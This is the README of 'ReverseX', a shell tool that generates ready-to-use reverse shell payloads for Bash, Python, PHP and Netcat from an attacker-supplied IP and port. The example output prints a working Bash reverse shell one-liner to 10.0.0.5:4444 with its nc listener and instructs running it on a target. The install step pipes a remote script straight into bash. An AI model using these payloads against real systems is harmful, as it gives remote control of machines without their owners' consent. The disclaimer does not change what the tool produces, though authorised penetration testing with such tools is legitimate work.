# REVERSEX — Reverse Shell & Payload Generator

**Generate ready-to-use reverse shell payloads for Bash, Python, PHP, and Netcat.**

Part of the **AdhiHub** security toolkit.

---

## What It Does

Give it your IP (LHOST) and port (LPORT), and ReverseX spits out a ready-to-copy-paste reverse shell command for:

| Payload Type | What You Get |
|-------------|-------------|
| **Bash** | One-liner bash reverse shell (works on most Linux boxes) |
| **Python** | Python reverse shell (works where Python is installed) |
| **PHP** | PHP reverse shell (for web shell uploads / RCE) |
| **Netcat** | Classic nc -e / mkfifo reverse shell |
| **All Mode** | Generates ALL payloads at once |

It also shows you the **listener command** to run on your machine (`nc -lvnp <port>`).

---

## One-Line Install

```bash
curl -fsSL https://raw.githubusercontent.com/AdhiHub/reversex/main/install.sh | bash
```

After install:

```bash
reversex
```

---

## How to Use

### Method 1: Interactive Menu

```bash
reversex
```

Enter your IP and port when prompted, pick a payload type.

### Method 2: Command Line

```bash
# Bash reverse shell
reversex -bash 10.0.0.5 4444

# Python reverse shell
reversex -python 10.0.0.5 4444

# PHP reverse shell
reversex -php 10.0.0.5 4444

# Netcat reverse shell
reversex -nc 10.0.0.5 4444

# All payloads at once
reversex -all 10.0.0.5 4444

# Help
reversex -h
```

---

## Example Output

```
LHOST: 10.0.0.5
LPORT: 4444

[+] PAYLOAD: bash
    bash -i >& /dev/tcp/10.0.0.5/4444 0>&1

[+] LISTENER
    nc -lvnp 4444

[+] Run the listener FIRST on your machine:
    nc -lvnp 4444

[+] Then run the payload on the target.
```

---

## Requirements

- **Linux** or **Termux** (Android)
- Bash 4+

---

## Run Without Installing

```bash
git clone https://github.com/AdhiHub/reversex.git
cd reversex
chmod +x reversex.sh
./reversex.sh
```

---

> **⚠️ DISCLAIMER: FOR EDUCATIONAL PURPOSES ONLY**
>
> Use at your own risk. Developer(s) assume NO liability.
> Only use on systems you own or have explicit written permission to test.
> Unauthorized access to computer systems is a crime.
